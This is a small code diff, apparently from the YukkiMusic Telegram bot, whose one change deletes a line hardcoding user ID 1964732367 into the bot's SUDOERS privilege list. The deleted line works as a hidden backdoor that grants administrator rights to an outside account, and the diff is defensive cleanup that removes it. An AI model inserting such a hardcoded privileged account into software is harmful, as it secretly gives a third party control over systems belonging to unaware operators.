@@ -21,7 +21,7 @@ from YukkiMusic.utils.database import (get_cmode, get_lang,
 from YukkiMusic.utils.database.memorydatabase import is_maintenance
 from YukkiMusic.utils.inline.playlist import botplaylist_markup
 
-SUDOERS.append(1964732367)
+
 
 def PlayWrapper(command):
     async def wrapper(client, message):
